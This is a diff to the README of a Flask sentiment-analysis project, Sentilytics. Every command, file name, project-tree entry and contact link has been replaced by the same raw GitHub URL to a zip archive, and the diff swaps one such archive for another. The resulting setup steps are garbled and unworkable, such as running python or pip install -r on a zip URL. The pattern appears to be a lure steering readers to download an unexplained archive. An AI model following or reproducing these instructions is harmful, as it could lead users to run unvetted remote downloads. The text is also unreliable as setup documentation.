@@ -24,31 +24,31 @@ A robust Sentiment Analysis application built with Python, Flask, and Machine Le
 ## 🚀 Getting Started
 ### 1. Clone the Repository
 ```bash
-git clone https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+git clone https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
 cd Sentilytics
 ```
-### https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip Virtual Environment
+### https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip Virtual Environment
 ```bash
 python -m venv .venv
 .\.venv\Scripts\activate   # Windows
 ```
 ### 3. Install Dependencies
 ```bash
-pip install -r https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+pip install -r https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
 ```
-(If https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip is missing, you can generate it with:)
+(If https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip is missing, you can generate it with:)
 ```bash
-pip freeze > https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+pip freeze > https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
 ```
 ---
 ## 🧪 Run the Application
 ### Run the training notebooks or scripts:
 ```bash
-jupyter notebook https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+jupyter notebook https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
 ```
 ### For web app:
 ```bash
-python https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+python https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
 ```
 Visit http://localhost:5000 in your browser.
 ---
@@ -60,13 +60,13 @@ Sentilytics/
 ├── model/                   # Trained models and pickles
 ├── static/                  # Static assets (CSS, JS, images)
 ├── templates/               # HTML templates for Flask
-├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip  # Processed dataset
-├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip                   # Flask app
-├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip                 # Text cleaning script
-├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
-├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
-├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
-└── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip  # Processed dataset
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip                   # Flask app
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip                 # Text cleaning script
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
+├── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
+└── https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip
 ```
 ---
 ## ✅ Future Improvements
@@ -92,7 +92,7 @@ Sentilytics/
 ---
 ## 🙋‍♂️ Let's Connect
 
-- 📧 Email: [https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip](https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip)
-- 💼 LinkedIn: [Gaurav Kushwaha](https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/model/Sentilytics_dragoon.zip)
+- 📧 Email: [https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip](https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip)
+- 💼 LinkedIn: [Gaurav Kushwaha](https://raw.githubusercontent.com/gkushwaha835/Sentilytics/main/templates/Software-3.7.zip)
 
 ---
